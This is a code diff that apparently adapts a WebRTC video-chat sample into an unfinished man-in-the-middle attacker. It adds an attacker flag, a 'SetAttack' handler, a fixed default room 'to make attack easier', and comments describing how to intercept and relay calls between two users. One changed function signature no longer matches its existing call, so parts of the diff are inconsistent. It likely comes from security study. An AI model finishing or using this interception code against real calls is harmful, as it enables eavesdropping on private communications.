@@ -1,7 +1,9 @@
 'use strict';
 
 var isChannelReady = false;
-var isInitiator = false;
+var isA = false;//User A
+var isAttacker = true;//sets attacker on room
+var isB = false;//User B
 var isStarted = false;
 var localStream;
 var pc;
@@ -22,34 +24,50 @@ var sdpConstraints = {
 
 /////////////////////////////////////////////
 
-//var room = 'foo';
+//use default name to make attack easier
+// var room = 'foo';
 // Could prompt for room name:
-var room = prompt('Enter room name:');
+//var room = prompt('Enter room name:');
 
 var socket = io.connect();
+socket.emit('create or join');
+var myroom = null;
 
-if (room !== '') {
-  socket.emit('create or join', room);
-  console.log('Attempted to create or  join room', room);
-}
+// if (room !== '') {
+//   socket.emit('create or join', room);
+//   console.log('Attempted to create or  join room', room);
+// }
+
+//Added to set attack for MiTM
+socket.on('SetAttack', function(room) {
+  console.log('Created room ' + room);
+  isAttacker = true;
+  myroom = room;
+});
+
 
 socket.on('created', function(room) {
   console.log('Created room ' + room);
-  isInitiator = true;
+  isA = true;
+  myroom = room;
 });
 
 socket.on('full', function(room) {
   console.log('Room ' + room + ' is full');
+  myroom = room;
 });
 
 socket.on('join', function (room){
   console.log('Another peer made a request to join room ' + room);
   console.log('This peer is the initiator of room ' + room + '!');
   isChannelReady = true;
+  myroom = room;
+  // socket.emit('readyAttack', room);
 });
 
 socket.on('joined', function(room) {
   console.log('joined: ' + room);
+  myroom = room;
   isChannelReady = true;
 });
 
@@ -59,7 +77,7 @@ socket.on('log', function(array) {
 
 ////////////////////////////////////////////////
 
-function sendMessage(message) {
+function sendMessage(myroom, message) {
   console.log('Client sending message: ', message);
   socket.emit('message', message);
 }
@@ -70,7 +88,7 @@ socket.on('message', function(message) {
   if (message === 'got user media') {
     maybeStart();
   } else if (message.type === 'offer') {
-    if (!isInitiator && !isStarted) {
+    if (!isA && !isStarted) {
       maybeStart();
     }
     pc.setRemoteDescription(new RTCSessionDescription(message));
@@ -102,13 +120,21 @@ navigator.mediaDevices.getUserMedia({
   alert('getUserMedia() error: ' + e.name);
 });
 
+//modified for attacker -- need to set local stream to A's media and remote stream to B's
 function gotStream(stream) {
   console.log('Adding local stream.');
-  localStream = stream;
-  localVideo.srcObject = stream;
-  sendMessage('got user media');
-  if (isInitiator) {
-    maybeStart();
+
+  //Added -- need to control logic
+  if(isAttacker){
+    localStream = null; 
+  }else{
+    localStream = stream;
+    localVideo.srcObject = stream;
+    sendMessage('got user media');
+    if (isA) {
+      maybeStart();
+    }
+
   }
 }
 
@@ -131,8 +157,8 @@ function maybeStart() {
     createPeerConnection();
     pc.addStream(localStream);
     isStarted = true;
-    console.log('isInitiator', isInitiator);
-    if (isInitiator) {
+    console.log('isA', isA);
+    if (isA) {
       doCall();
     }
   }
@@ -176,11 +202,13 @@ function handleCreateOfferError(event) {
   console.log('createOffer() error: ', event);
 }
 
+//A will call this function and attacker will answer; Attacker will also call this function and send to B
 function doCall() {
   console.log('Sending offer to peer');
   pc.createOffer(setLocalAndSendMessage, handleCreateOfferError);
 }
 
+//Attacker will need to answer for A and forward B's info
 function doAnswer() {
   console.log('Sending answer to peer.');
   pc.createAnswer().then(
@@ -247,7 +275,7 @@ function hangup() {
 function handleRemoteHangup() {
   console.log('Session terminated.');
   stop();
-  isInitiator = false;
+  isA = false;
 }
 
 function stop() {
